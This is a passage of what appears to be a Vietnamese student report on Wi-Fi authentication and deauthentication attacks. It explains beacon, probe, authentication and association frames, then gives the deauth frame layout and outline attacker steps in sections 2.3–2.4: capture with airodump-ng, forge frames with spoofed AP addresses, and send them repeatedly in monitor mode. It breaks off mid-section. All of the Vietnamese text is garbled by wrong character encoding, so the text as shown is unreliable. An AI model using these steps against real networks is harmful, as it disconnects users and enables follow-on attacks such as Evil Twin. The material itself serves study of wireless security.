# 1Ô∏è‚É£ Gi·ªõi thi·ªáu v·ªÅ WiFi & C∆° ch·∫ø x√°c th·ª±c (Ng∆∞·ªùi 1)
## WiFi ho·∫°t ƒë·ªông nh∆∞ th·∫ø n√†o?
- Wi-Fi l√† m·ªôt c√¥ng ngh·ªá kh√¥ng d√¢y d√πng ƒë·ªÉ k·∫øt n·ªëi m·∫°ng, v√¨ v·∫≠y n√≥ s·ª≠ d·ª•ng s√≥ng ƒëi·ªán t·ª´ ƒë·ªÉ truy·ªÅn t·∫£i m·∫°ng. Ch√∫ng ta bi·∫øt r·∫±ng s√≥ng ƒëi·ªán t·ª´ c√≥ nhi·ªÅu lo·∫°i kh√°c nhau d·ª±a tr√™n t·∫ßn s·ªë c·ªßa ch√∫ng, ch·∫≥ng h·∫°n nh∆∞ tia X, tia Gamma, s√≥ng v√¥ tuy·∫øn, s√≥ng vi ba, v.v. Trong Wi-Fi, t·∫ßn s·ªë s√≥ng v√¥ tuy·∫øn ƒë∆∞·ª£c s·ª≠ d·ª•ng. ƒê·ªÉ truy·ªÅn t√≠n hi·ªáu Wi-Fi, c√≥ ba ph∆∞∆°ng th·ª©c ch√≠nh:
    - M·∫°ng tr·∫°m g·ªëc ho·∫∑c k·∫øt n·ªëi Ethernet (802.3): ƒê√¢y l√† m·∫°ng ch·ªß ch√≠nh cung c·∫•p k·∫øt n·ªëi m·∫°ng cho b·ªô ƒë·ªãnh tuy·∫øn (router).
ƒêi·ªÉm truy c·∫≠p ho·∫∑c b·ªô ƒë·ªãnh tuy·∫øn (Access Point / Router): ƒê√¢y l√† c·∫ßu n·ªëi gi·ªØa m·∫°ng c√≥ d√¢y v√† m·∫°ng kh√¥ng d√¢y. N√≥ nh·∫≠n k·∫øt n·ªëi Ethernet c√≥ d√¢y, sau ƒë√≥ chuy·ªÉn ƒë·ªïi th√†nh k·∫øt n·ªëi kh√¥ng d√¢y v√† ph√°t t√≠n hi·ªáu d∆∞·ªõi d·∫°ng s√≥ng v√¥ tuy·∫øn.
    - Thi·∫øt b·ªã truy c·∫≠p: ƒê√¢y l√† c√°c thi·∫øt b·ªã nh∆∞ ƒëi·ªán tho·∫°i di ƒë·ªông, m√°y t√≠nh, v.v., m√† ch√∫ng ta s·ª≠ d·ª•ng ƒë·ªÉ k·∫øt n·ªëi Wi-Fi v√† l∆∞·ªõt Internet.
    - T·∫•t c·∫£ c√°c thi·∫øt b·ªã ƒëi·ªán t·ª≠ ƒë·ªÅu ƒë·ªçc d·ªØ li·ªáu d∆∞·ªõi d·∫°ng nh·ªã ph√¢n, bao g·ªìm c·∫£ b·ªô ƒë·ªãnh tuy·∫øn v√† thi·∫øt b·ªã c·ªßa ch√∫ng ta. B·ªô ƒë·ªãnh tuy·∫øn ph√°t s√≥ng v√¥ tuy·∫øn, v√† c√°c thi·∫øt b·ªã nh·∫≠n s√≥ng n√†y, sau ƒë√≥ chuy·ªÉn ƒë·ªïi th√†nh d·ªØ li·ªáu nh·ªã ph√¢n. S√≥ng c√≥ h√¨nh d·∫°ng dao ƒë·ªông, trong ƒë√≥ ƒë·ªânh s√≥ng ƒë∆∞·ª£c bi·ªÉu th·ªã l√† 1 v√† ƒë√°y s√≥ng ƒë∆∞·ª£c bi·ªÉu th·ªã l√† 0 trong h·ªá nh·ªã ph√¢n, nh∆∞ minh h·ªça d∆∞·ªõi ƒë√¢y:
- M·ªôt s·ªë thu·∫≠t ng·ªØ quan tr·ªçng trong Wi-Fi:
    - SSID (Service Set Identifier): ƒê√¢y l√† m·ªôt chu·ªói k√Ω t·ª± d√†i t·ªëi ƒëa 32 k√Ω t·ª± d√πng ƒë·ªÉ nh·∫≠n di·ªán m·∫°ng Wi-Fi v√† ph√¢n bi·ªát m·∫°ng n√†y v·ªõi m·∫°ng kh√°c. M·ªçi thi·∫øt b·ªã mu·ªën k·∫øt n·ªëi ƒë·ªÅu ph·∫£i t√¨m ki·∫øm SSID c·ª• th·ªÉ. SSID ch√≠nh l√† t√™n c·ªßa m·∫°ng kh√¥ng d√¢y.
    - WPA-PSK (Wi-Fi Protected Access - Pre-Shared Key): ƒê√¢y l√† ch∆∞∆°ng tr√¨nh ƒë∆∞·ª£c ph√°t tri·ªÉn b·ªüi Wi-Fi Alliance nh·∫±m b·∫£o v·ªá m·∫°ng kh√¥ng d√¢y b·∫±ng ph∆∞∆°ng th·ª©c x√°c th·ª±c b·∫±ng kh√≥a chia s·∫ª tr∆∞·ªõc (Pre-Shared Key). WPA c√≥ ba phi√™n b·∫£n ch√≠nh: WPA, WPA2 v√† WPA3, gi√∫p m√£ h√≥a t√≠n hi·ªáu Wi-Fi ƒë·ªÉ ngƒÉn ch·∫∑n ng∆∞·ªùi d√πng kh√¥ng mong mu·ªën truy c·∫≠p tr√°i ph√©p.

---


- C√°c ch·∫ø ƒë·ªô ho·∫°t ƒë·ªông c·ªßa WiFi: Infrastructure Mode vs. Ad-hoc Mode.
    - M·∫°ng c∆° s·ªü h·∫° t·∫ßng (Infrastructure networks): ƒê√¢y l√† lo·∫°i m·∫°ng kh√¥ng d√¢y ph·ªï bi·∫øn nh·∫•t, bao g·ªìm m·ªôt ƒëi·ªÉm truy c·∫≠p kh√¥ng d√¢y (wireless access point) ƒë∆∞·ª£c k·∫øt n·ªëi v·ªõi Internet v√† m·ªôt nh√≥m thi·∫øt b·ªã k·∫øt n·ªëi v·ªõi ƒëi·ªÉm truy c·∫≠p ƒë√≥.
    - M·∫°ng Ad-hoc: C√≤n ƒë∆∞·ª£c g·ªçi l√† m·∫°ng ngang h√†ng (peer-to-peer networks), ƒë√¢y l√† lo·∫°i m·∫°ng bao g·ªìm m·ªôt nh√≥m thi·∫øt b·ªã c√≥ th·ªÉ giao ti·∫øp tr·ª±c ti·∫øp v·ªõi nhau m√† kh√¥ng c·∫ßn m·ªôt ƒëi·ªÉm truy c·∫≠p trung t√¢m.
---

## Qu√° tr√¨nh x√°c th·ª±c & k·∫øt n·ªëi gi·ªØa client v√† Access Point (AP).

![image](https://hackmd.io/_uploads/HJyI9vg2yg.png)
![image](https://hackmd.io/_uploads/S1dL9we3Jl.png)

- Passive scanning: Thi·∫øt b·ªã kh√°ch s·∫Ω l·∫Øng nghe c√°c t√≠n hi·ªáu radio t·ª´ c√°c AP trong khu v·ª±c. C√°c AP th∆∞·ªùng ph√°t s√≥ng c√°c khung tin (beacon frames) ƒë·ªãnh k·ª≥ ƒë·ªÉ th√¥ng b√°o s·ª± hi·ªán di·ªán c·ªßa ch√∫ng.

    - Th√¥ng tin kh·∫£ nƒÉng: Ch·ª©a th√¥ng tin v·ªÅ kh·∫£ nƒÉng c·ªßa thi·∫øt b·ªã/m·∫°ng
    - D·∫•u th·ªùi gian: Sau khi nh·∫≠n ƒë∆∞·ª£c khung beacon, t·∫•t c·∫£ c√°c tr·∫°m s·∫Ω c·∫≠p nh·∫≠t ƒë·ªìng h·ªì c·ª•c b·ªô c·ªßa ch√∫ng b·∫±ng d·∫•u th·ªùi gian n√†y. ƒêi·ªÅu n√†y gi√∫p ƒë·ªìng b·ªô h√≥a.
    - Kho·∫£ng th·ªùi gian Beacon: Bi·ªÉu th·ªã s·ªë ƒê∆°n v·ªã th·ªùi gian (TU) gi·ªØa Th·ªùi gian truy·ªÅn Beacon m·ª•c ti√™u (TBTT). Gi√° tr·ªã m·∫∑c ƒë·ªãnh l√† 100TU (102,4 mili gi√¢y).
    - SSID: Ch·ª©a ID b·ªô d·ªãch v·ª• c·ªßa m·∫°ng.

- Active scan (qu√©t ch·ªß ƒë·ªông) trong m·∫°ng Wi-Fi l√† m·ªôt ph∆∞∆°ng ph√°p m√† thi·∫øt b·ªã kh√°ch (client) s·ª≠ d·ª•ng ƒë·ªÉ ph√°t hi·ªán c√°c m·∫°ng kh√¥ng d√¢y b·∫±ng c√°ch g·ª≠i y√™u c·∫ßu ƒë·∫øn c√°c access point (AP) v√† ch·ªù ph·∫£n h·ªìi. 
- C√°ch Th·ª©c Ho·∫°t ƒê·ªông:
    - G·ª≠i Y√™u C·∫ßu Probe: Thi·∫øt b·ªã kh√°ch g·ª≠i m·ªôt ho·∫∑c nhi·ªÅu y√™u c·∫ßu probe (probe request) ƒë·∫øn c√°c k√™nh kh√¥ng d√¢y. Y√™u c·∫ßu n√†y c√≥ th·ªÉ bao g·ªìm SSID c·ªßa m·∫°ng m√† thi·∫øt b·ªã kh√°ch ƒëang t√¨m ki·∫øm ho·∫∑c c√≥ th·ªÉ ƒë·ªÉ tr·ªëng ƒë·ªÉ t√¨m ki·∫øm t·∫•t c·∫£ c√°c m·∫°ng kh·∫£ d·ª•ng.
![image](https://hackmd.io/_uploads/rktNjwg3Jg.png)
    - Ch·ªù Ph·∫£n H·ªìi: Sau khi g·ª≠i y√™u c·∫ßu probe, thi·∫øt b·ªã kh√°ch s·∫Ω l·∫Øng nghe c√°c ph·∫£n h·ªìi t·ª´ c√°c AP trong khu v·ª±c. C√°c AP s·∫Ω g·ª≠i l·∫°i c√°c khung tin probe response, ch·ª©a th√¥ng tin v·ªÅ m·∫°ng c·ªßa ch√∫ng.
- Th√¥ng Tin Nh·∫≠n ƒê∆∞·ª£c: C√°c khung tin probe response ch·ª©a th√¥ng tin quan tr·ªçng nh∆∞:
    - SSID (Service Set Identifier): T√™n c·ªßa m·∫°ng Wi-Fi.
    - Th√¥ng tin v·ªÅ lo·∫°i b·∫£o m·∫≠t (WPA, WPA2, WPA3, v.v.).
    - Th√¥ng tin v·ªÅ k√™nh m√† AP ƒëang s·ª≠ d·ª•ng.
    - Th√¥ng tin v·ªÅ t·ªëc ƒë·ªô truy·ªÅn d·ªØ li·ªáu v√† c√°c th√¥ng s·ªë kh√°c
- Authentication: 
![image](https://hackmd.io/_uploads/rkg0RsDxhyx.png)
    - Authentication Algorithm Number: Tr∆∞·ªùng n√†y x√°c ƒë·ªãnh thu·∫≠t to√°n x√°c th·ª±c ƒë∆∞·ª£c s·ª≠ d·ª•ng trong qu√° tr√¨nh x√°c th·ª±c.
        - Open System Authentication (X√°c th·ª±c H·ªá th·ªëng M·ªü) - ƒê√¢y l√† ph∆∞∆°ng ph√°p x√°c th·ª±c ƒë∆°n gi·∫£n, kh√¥ng y√™u c·∫ßu b·∫•t k·ª≥ th√¥ng tin x√°c th·ª±c n√†o t·ª´ client. Client c√≥ th·ªÉ k·∫øt n·ªëi ngay l·∫≠p t·ª©c v·ªõi AP.
        - Shared Key Authentication (X√°c th·ª±c Kh√≥a Chung) - Ph∆∞∆°ng ph√°p n√†y y√™u c·∫ßu client v√† AP ph·∫£i chia s·∫ª m·ªôt kh√≥a b√≠ m·∫≠t. Client s·∫Ω ph·∫£i ch·ª©ng minh r·∫±ng n√≥ bi·∫øt kh√≥a n√†y th√¥ng qua m·ªôt quy tr√¨nh x√°c th·ª±c.
    - Authentication Transaction Sequence Number: Tr∆∞·ªùng n√†y ch·ªâ ƒë·ªãnh tr·∫°ng th√°i hi·ªán t·∫°i c·ªßa qu√° tr√¨nh x√°c th·ª±c. N√≥ gi√∫p theo d√µi ti·∫øn tr√¨nh c·ªßa qu√° tr√¨nh x√°c th·ª±c gi·ªØa client v√† AP. Gi√° tr·ªã n√†y th∆∞·ªùng b·∫Øt ƒë·∫ßu t·ª´ 1 v√† tƒÉng l√™n theo t·ª´ng b∆∞·ªõc trong quy tr√¨nh x√°c th·ª±c. V√≠ d·ª•, trong qu√° tr√¨nh x√°c th·ª±c b·∫±ng kh√≥a chung, c√≥ th·ªÉ c√≥ nhi·ªÅu b∆∞·ªõc, v√† tr∆∞·ªùng n√†y s·∫Ω cho bi·∫øt client ƒëang ·ªü b∆∞·ªõc n√†o.
     - Status Code: Tr∆∞·ªùng n√†y cho bi·∫øt k·∫øt qu·∫£ c·ªßa qu√° tr√¨nh x√°c th·ª±c.
         - 0: Success (Th√†nh c√¥ng) - ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† qu√° tr√¨nh x√°c th·ª±c ƒë√£ ho√†n t·∫•t th√†nh c√¥ng v√† client c√≥ th·ªÉ k·∫øt n·ªëi v·ªõi AP.
         - 1: Unspecified failures (L·ªói kh√¥ng x√°c ƒë·ªãnh) - ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† c√≥ m·ªôt l·ªói x·∫£y ra trong qu√° tr√¨nh x√°c th·ª±c, nh∆∞ng kh√¥ng c√≥ th√¥ng tin c·ª• th·ªÉ n√†o ƒë∆∞·ª£c cung c·∫•p v·ªÅ l·ªói ƒë√≥.
    - Challenge Text: Tr∆∞·ªùng n√†y ch·ªâ ƒë∆∞·ª£c s·ª≠ d·ª•ng trong khung x√°c th·ª±c kh√≥a chung (Shared Key Authentication). N√≥ ch·ª©a m·ªôt chu·ªói th√°ch th·ª©c (challenge) m√† AP g·ª≠i ƒë·∫øn client. Client s·∫Ω ph·∫£i m√£ h√≥a chu·ªói th√°ch th·ª©c n√†y b·∫±ng kh√≥a chung m√† n√≥ chia s·∫ª v·ªõi AP v√† g·ª≠i l·∫°i cho AP. AP s·∫Ω ki·ªÉm tra xem ph·∫£n h·ªìi c·ªßa client c√≥ ƒë√∫ng hay kh√¥ng ƒë·ªÉ x√°c th·ª±c client.
- Association Request (Y√™u c·∫ßu K·∫øt n·ªëi) l√† m·ªôt khung tin (frame) trong giao th·ª©c Wi-Fi (802.11) ƒë∆∞·ª£c s·ª≠ d·ª•ng b·ªüi client (thi·∫øt b·ªã kh√°ch) ƒë·ªÉ y√™u c·∫ßu k·∫øt n·ªëi v·ªõi m·ªôt access point (AP) sau khi qu√° tr√¨nh x√°c th·ª±c ƒë√£ th√†nh c√¥ng. ƒê√¢y l√† b∆∞·ªõc quan tr·ªçng trong quy tr√¨nh k·∫øt n·ªëi gi·ªØa client v√† AP. D∆∞·ªõi ƒë√¢y l√† m·ªôt s·ªë th√¥ng tin chi ti·∫øt v·ªÅ Association Request:
![image](https://hackmd.io/_uploads/BJ0mlYx2yg.png)
- N·ªôi Dung c·ªßa Association Request: Khung tin n√†y ch·ª©a nhi·ªÅu tr∆∞·ªùng th√¥ng tin quan tr·ªçng, bao g·ªìm:
    - Destination Address: ƒê·ªãa ch·ªâ MAC c·ªßa AP m√† client mu·ªën k·∫øt n·ªëi.
    - Source Address: ƒê·ªãa ch·ªâ MAC c·ªßa client.
    - BSSID: ƒê·ªãa ch·ªâ MAC c·ªßa AP (c√≥ th·ªÉ gi·ªëng v·ªõi Destination Address).
    - SSID: T√™n c·ªßa m·∫°ng Wi-Fi m√† client mu·ªën k·∫øt n·ªëi.
    - Capability Information: Th√¥ng tin v·ªÅ kh·∫£ nƒÉng c·ªßa client, ch·∫≥ng h·∫°n nh∆∞ h·ªó tr·ª£ c√°c ch·∫ø ƒë·ªô b·∫£o m·∫≠t kh√°c nhau.
- Association response: Sau khi y√™u c·∫ßu li√™n k·∫øt ƒë∆∞·ª£c x√°c nh·∫≠n, AP s·∫Ω ki·ªÉm tra t·ª´ng tr∆∞·ªùng c·ªßa y√™u c·∫ßu v√† x√°c minh r·∫±ng t·∫•t c·∫£ ch√∫ng ƒë·ªÅu kh·ªõp v·ªõi c√°c tham s·ªë 802.11 c·ªßa ch√≠nh n√≥ (tham kh·∫£o H√¨nh 6). Trong tr∆∞·ªùng h·ª£p tham s·ªë kh√¥ng kh·ªõp, AP s·∫Ω ki·ªÉm tra xem s·ª± kh√°c bi·ªát c√≥ ph·∫£i l√† ch·∫∑n hay kh√¥ng v√† d·ª±a tr√™n ƒë√≥, AP s·∫Ω g·ª≠i ph·∫£n h·ªìi x√°c th·ª±c.
- N·∫øu s·ª± kh√°c bi·ªát v·ªÅ tham s·ªë l√† ch·∫∑n, th√¨ ph·∫£n h·ªìi v·ªõi m√£ tr·∫°ng th√°i 1 s·∫Ω ƒë∆∞·ª£c g·ª≠i (ƒë·ªÉ t·ª´ ch·ªëi li√™n k·∫øt).
- Trong tr∆∞·ªùng h·ª£p s·ª± kh√°c bi·ªát kh√¥ng ch·∫∑n/Kh√¥ng c√≥ s·ª± kh√°c bi·ªát v·ªÅ tham s·ªë, ph·∫£n h·ªìi v·ªõi m√£ tr·∫°ng th√°i 0 (th√†nh c√¥ng) v√† c√°c tham s·ªë ri√™ng c·ªßa AP s·∫Ω ƒë∆∞·ª£c g·ª≠i ƒë·∫øn client.
 ![image](https://hackmd.io/_uploads/By9wNtenyl.png)


https://community.nxp.com/t5/Wi-Fi-Bluetooth-802-15-4/802-11-Wi-Fi-Connection-Disconnection-process/ta-p/1121148
- Gi·∫£i th√≠ch v·ªÅ Management Frames v√† vai tr√≤ c·ªßa Deauthentication Frame.
Management frames are used to manage the BSS. This includes probing, associating, roaming, and disconnecting clients from the BSS.
![image](https://hackmd.io/_uploads/HyT9EYg2Jl.png)
- De-authentication Frame (khung h·ªßy x√°c th·ª±c) trong giao th·ª©c IEEE 802.11 (Wi-Fi) c√≥ vai tr√≤ quan tr·ªçng trong vi·ªác qu·∫£n l√Ω k·∫øt n·ªëi gi·ªØa thi·∫øt b·ªã (client) v√† ƒëi·ªÉm truy c·∫≠p (access point). D∆∞·ªõi ƒë√¢y l√† m·ªôt s·ªë vai tr√≤ ch√≠nh c·ªßa De-authentication Frame:
    - Ng·∫Øt K·∫øt N·ªëi: De-authentication Frame ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ th√¥ng b√°o r·∫±ng m·ªôt thi·∫øt b·ªã ƒë√£ b·ªã ng·∫Øt k·∫øt n·ªëi kh·ªèi m·∫°ng. ƒêi·ªÅu n√†y c√≥ th·ªÉ x·∫£y ra khi ng∆∞·ªùi d√πng ch·ªçn ng·∫Øt k·∫øt n·ªëi, khi thi·∫øt b·ªã di chuy·ªÉn ra ngo√†i v√πng ph·ªß s√≥ng, ho·∫∑c khi ƒëi·ªÉm truy c·∫≠p quy·∫øt ƒë·ªãnh ng·∫Øt k·∫øt n·ªëi thi·∫øt b·ªã v√¨ l√Ω do n√†o ƒë√≥.
    - B·∫£o M·∫≠t M·∫°ng: Khung n√†y c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ b·∫£o v·ªá m·∫°ng kh·ªèi c√°c m·ªëi ƒëe d·ªça. N·∫øu m·ªôt thi·∫øt b·ªã b·ªã ph√°t hi·ªán c√≥ h√†nh vi ƒë√°ng ng·ªù ho·∫∑c kh√¥ng h·ª£p l·ªá, ƒëi·ªÉm truy c·∫≠p c√≥ th·ªÉ g·ª≠i De-authentication Frame ƒë·ªÉ ng·∫Øt k·∫øt n·ªëi thi·∫øt b·ªã ƒë√≥, gi√∫p b·∫£o v·ªá m·∫°ng kh·ªèi c√°c cu·ªôc t·∫•n c√¥ng ho·∫∑c truy c·∫≠p tr√°i ph√©p.
    - Qu·∫£n L√Ω T√†i Nguy√™n: Khi m·ªôt thi·∫øt b·ªã kh√¥ng c√≤n c·∫ßn thi·∫øt ƒë·ªÉ k·∫øt n·ªëi, vi·ªác g·ª≠i De-authentication Frame gi√∫p gi·∫£i ph√≥ng t√†i nguy√™n m·∫°ng. ƒêi·ªÅu n√†y cho ph√©p c√°c thi·∫øt b·ªã kh√°c c√≥ th·ªÉ k·∫øt n·ªëi v√† s·ª≠ d·ª•ng bƒÉng th√¥ng m·∫°ng m·ªôt c√°ch hi·ªáu qu·∫£ h∆°n.
    - Th√¥ng b√°o cho Thi·∫øt b·ªã: Khi m·ªôt thi·∫øt b·ªã nh·∫≠n ƒë∆∞·ª£c De-authentication Frame, n√≥ s·∫Ω bi·∫øt r·∫±ng n√≥ ƒë√£ b·ªã ng·∫Øt k·∫øt n·ªëi v√† c√≥ th·ªÉ th·ª±c hi·ªán c√°c h√†nh ƒë·ªông c·∫ßn thi·∫øt, ch·∫≥ng h·∫°n nh∆∞ t√¨m ki·∫øm l·∫°i c√°c m·∫°ng c√≥ s·∫µn ho·∫∑c th√¥ng b√°o cho ng∆∞·ªùi d√πng v·ªÅ vi·ªác ng·∫Øt k·∫øt n·ªëi.
    - H·ªó tr·ª£ trong qu√° tr√¨nh chuy·ªÉn ti·∫øp: Trong c√°c m·∫°ng l·ªõn, khi m·ªôt thi·∫øt b·ªã di chuy·ªÉn t·ª´ m·ªôt ƒëi·ªÉm truy c·∫≠p n√†y sang m·ªôt ƒëi·ªÉm truy c·∫≠p kh√°c, De-authentication Frame c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ th√¥ng b√°o r·∫±ng thi·∫øt b·ªã ƒë√£ b·ªã ng·∫Øt k·∫øt n·ªëi kh·ªèi ƒëi·ªÉm truy c·∫≠p c≈© tr∆∞·ªõc khi k·∫øt n·ªëi v·ªõi ƒëi·ªÉm truy c·∫≠p m·ªõi.


# 2Ô∏è‚É£ Deauthentication Attack l√† g√¨? (Ng∆∞·ªùi 2)
## 2.1. ƒê·ªãnh nghƒ©a & Nguy√™n l√Ω ho·∫°t ƒë·ªông

**Deauthentication Attack** l√† m·ªôt k·ªπ thu·∫≠t t·∫•n c√¥ng nh·∫±m ph√° v·ª° k·∫øt n·ªëi gi·ªØa client v√† Access Point (AP) b·∫±ng c√°ch g·ª≠i c√°c **deauthentication frames** gi·∫£ m·∫°o. Theo ti√™u chu·∫©n IEEE 802.11, c√°c khung qu·∫£n l√Ω nh∆∞ deauthentication kh√¥ng ƒë∆∞·ª£c m√£ h√≥a ho·∫∑c x√°c th·ª±c, do ƒë√≥ d·ªÖ b·ªã gi·∫£ m·∫°o.

- **C√°ch th·ª©c ho·∫°t ƒë·ªông:**  
  Khi m·ªôt client k·∫øt n·ªëi v·ªõi AP, c√°c g√≥i tin qu·∫£n l√Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ duy tr√¨ v√† qu·∫£n l√Ω k·∫øt n·ªëi. Trong ƒë√≥, **deauthentication frame** ƒë∆∞·ª£c d√πng ƒë·ªÉ th√¥ng b√°o r·∫±ng phi√™n k·∫øt n·ªëi gi·ªØa client v√† AP ƒë√£ b·ªã h·ªßy. K·∫ª t·∫•n c√¥ng khai th√°c l·ªó h·ªïng n√†y b·∫±ng c√°ch g·ª≠i li√™n t·ª•c c√°c g√≥i deauth gi·∫£ m·∫°o, khi·∫øn client tin r·∫±ng AP ƒë√£ ch·∫•m d·ª©t phi√™n l√†m vi·ªác, bu·ªôc client ph·∫£i ng·∫Øt k·∫øt n·ªëi v√† ti·∫øn h√†nh qu√° tr√¨nh x√°c th·ª±c l·∫°i.

- **V√≠ d·ª• th·ª±c ti·ªÖn:**  
  Gi·∫£ s·ª≠ c√≥ m·ªôt AP v·ªõi BSSID l√† `00:11:22:33:44:55` v√† m·ªôt client v·ªõi MAC `66:77:88:99:AA:BB`. K·∫ª t·∫•n c√¥ng g·ª≠i deauth frame t·ª´ ƒë·ªãa ch·ªâ c·ªßa AP ƒë·∫øn client, khi·∫øn thi·∫øt b·ªã c·ªßa client ng·∫Øt k·∫øt n·ªëi. ƒêi·ªÅu n√†y kh√¥ng ch·ªâ g√¢y gi√°n ƒëo·∫°n d·ªãch v·ª• m√† c√≤n t·∫°o ƒëi·ªÅu ki·ªán cho c√°c t·∫•n c√¥ng ti·∫øp theo (v√≠ d·ª•: Evil Twin).

## 2.2. C·∫•u tr√∫c c·ªßa G√≥i tin trong WiFi

### 2.2.1. G√≥i tin WiFi Th√¥ng Th∆∞·ªùng

Trong m·∫°ng WiFi, c√≥ ba lo·∫°i g√≥i tin ch√≠nh:
- **Management Frames:**  
  Bao g·ªìm Beacon, Probe Request/Response, Authentication, Association Request/Response, v.v.  
  V√≠ d·ª•, m·ªôt Beacon frame th√¥ng th∆∞·ªùng c·ªßa AP c√≥ c·∫•u tr√∫c:
  ```
  +--------------------+
  | Radiotap Header    |
  +--------------------+
  | Frame Control      | 2 bytes (cho Beacon)
  +--------------------+
  | Duration           | 2 bytes
  +--------------------+
  | Address 1          | 6 bytes (Broadcast MAC)
  +--------------------+
  | Address 2          | 6 bytes (MAC c·ªßa AP)
  +--------------------+
  | Address 3          | 6 bytes (BSSID)
  +--------------------+
  | Sequence Control   | 2 bytes
  +--------------------+
  | Frame Body         | C√°c IE (Information Elements) nh∆∞ SSID, Supported Rates, v.v.
  +--------------------+
  | FCS                | 4 bytes
  +--------------------+
  ```

- **Control Frames:**  
  Bao g·ªìm ACK, RTS/CTS, v.v.

- **Data Frames:**  
  Ch·ª©a d·ªØ li·ªáu truy·ªÅn t·∫£i gi·ªØa client v√† AP (th∆∞·ªùng ƒë∆∞·ª£c m√£ h√≥a n·∫øu s·ª≠ d·ª•ng WPA2/WPA3).

### 2.2.2. Format c·ªßa G√≥i tin Deauthentication

G√≥i tin Deauthentication l√† m·ªôt lo·∫°i Management Frame ƒë·∫∑c bi·ªát v·ªõi m·ª•c ƒë√≠ch th√¥ng b√°o h·ªßy k·∫øt n·ªëi. C·∫•u tr√∫c ƒëi·ªÉn h√¨nh c·ªßa g√≥i tin Deauthentication nh∆∞ sau:

```
+--------------------+
| Radiotap Header    |  (Th√¥ng tin v·ªÅ m√¥i tr∆∞·ªùng kh√¥ng d√¢y ‚Äì ƒë·ªô d√†i bi·∫øn ƒë·ªïi)
+--------------------+
| Frame Control      | 2 bytes (X√°c ƒë·ªãnh lo·∫°i frame, v√≠ d·ª•: 0xC0 0x00 cho Deauthentication)
+--------------------+
| Duration           | 2 bytes
+--------------------+
| Address 1          | 6 bytes (ƒê·ªãa ch·ªâ MAC c·ªßa client nh·∫≠n)
+--------------------+
| Address 2          | 6 bytes (ƒê·ªãa ch·ªâ MAC c·ªßa AP ‚Äì ngu·ªìn g·ªëc gi·∫£ m·∫°o)
+--------------------+
| Address 3          | 6 bytes (BSSID, th∆∞·ªùng gi·ªëng v·ªõi Address 2)
+--------------------+
| Sequence Control   | 2 bytes
+--------------------+
| Frame Body         |  (Ch·ª©a n·ªôi dung c·ªßa khung qu·∫£n l√Ω)
| - Reason Code      | 2 bytes (V√≠ d·ª•: 0x0007, ‚ÄúClass 3 frame received from nonassociated station‚Äù)
+--------------------+
| FCS                | 4 bytes (Frame Check Sequence ‚Äì d√πng ƒë·ªÉ ki·ªÉm tra l·ªói)
+--------------------+
```

#### Gi·∫£i th√≠ch c√°c tr∆∞·ªùng quan tr·ªçng:
- **Radiotap Header:** Cung c·∫•p th√¥ng tin ph·ª• v·ªÅ k√™nh, t·ªëc ƒë·ªô, c∆∞·ªùng ƒë·ªô t√≠n hi·ªáu, v.v.
- **Frame Control:** X√°c ƒë·ªãnh lo·∫°i frame (management, control, data); v·ªõi Deauthentication, tr∆∞·ªùng n√†y b√°o hi·ªáu ƒë√¢y l√† g√≥i qu·∫£n l√Ω h·ªßy k·∫øt n·ªëi.
- **Duration:** Th·ªùi gian d√†nh cho phi√™n truy·ªÅn d·ªØ li·ªáu c·ªßa g√≥i tin.
- **Address 1, 2, 3:**  
  - **Address 1:** MAC c·ªßa client nh·∫≠n.
  - **Address 2:** MAC c·ªßa AP (gi·∫£ m·∫°o khi t·∫•n c√¥ng).
  - **Address 3:** BSSID c·ªßa m·∫°ng (th∆∞·ªùng gi·ªëng v·ªõi Address 2).
- **Frame Body ‚Äì Reason Code:** X√°c ƒë·ªãnh l√Ω do h·ªßy k·∫øt n·ªëi (v√≠ d·ª•: reason code 7).
- **FCS:** D√πng ƒë·ªÉ ki·ªÉm tra l·ªói d·ªØ li·ªáu c·ªßa g√≥i tin.

## 2.3. Qu√° tr√¨nh Chuy·ªÉn ƒë·ªïi G√≥i tin WiFi Th√¥ng Th∆∞·ªùng sang G√≥i tin Deauthentication

1. **Thu th·∫≠p g√≥i tin th√¥ng th∆∞·ªùng:**  
   - D√πng c√¥ng c·ª• nh∆∞ **airodump-ng** ƒë·ªÉ b·∫Øt c√°c g√≥i tin Beacon, Authentication, Association t·ª´ AP.
   - X√°c ƒë·ªãnh c√°c tr∆∞·ªùng c·∫ßn thi·∫øt nh∆∞ ƒë·ªãa ch·ªâ MAC c·ªßa AP, client, k√™nh ho·∫°t ƒë·ªông, v.v.

2. **T·∫°o v√† ch·ªânh s·ª≠a g√≥i tin:**  
   - D·ª±a tr√™n g√≥i tin th√¥ng th∆∞·ªùng, k·∫ª t·∫•n c√¥ng s·∫Ω t·∫°o m·ªôt g√≥i tin m·ªõi v·ªõi c·∫•u tr√∫c t∆∞∆°ng t·ª±.  
   - Ch·ªânh s·ª≠a **Frame Control** ƒë·ªÉ b√°o hi·ªáu ƒë√¢y l√† Deauthentication frame (v√≠ d·ª•: 0xC0 0x00).
   - G√°n **Address 1** l√† MAC c·ªßa client m·ª•c ti√™u, **Address 2** v√† **Address 3** l√† MAC c·ªßa AP.
   - Th√™m **Reason Code** (v√≠ d·ª•: 7 ‚Äì ‚ÄúClass 3 frame received from nonassociated station‚Äù) v√†o Frame Body.

3. **G·ª≠i g√≥i tin:**  
   - G·ª≠i li√™n t·ª•c g√≥i tin Deauthentication qua giao di·ªán ƒë√£ chuy·ªÉn sang ch·∫ø ƒë·ªô monitor, nh·∫±m ƒë·∫£m b·∫£o client nh·∫≠n ƒë∆∞·ª£c v√† bu·ªôc ph·∫£i ng·∫Øt k·∫øt n·ªëi.

## 2.4. C√°ch khai th√°c l·ªó h·ªïng trong IEEE 802.11

- **Thi·∫øu b·∫£o v·ªá cho c√°c khung qu·∫£n l√Ω:**  
  C√°c khung tin qu·∫£n l√Ω nh∆∞ deauthentication kh√¥ng ƒë∆∞·ª£c b·∫£o v·ªá b·∫±ng m√£ h√≥a ho·∫∑c x√°c th·ª±c, t·∫°o c∆° h·ªôi cho k·∫ª t·∫•n c√¥ng t·∫°o ra c√°c g√≥i tin gi·∫£ m·∫°o.

- **Qu√° tr√¨nh t·∫•n c√¥ng chi ti·∫øt:**  
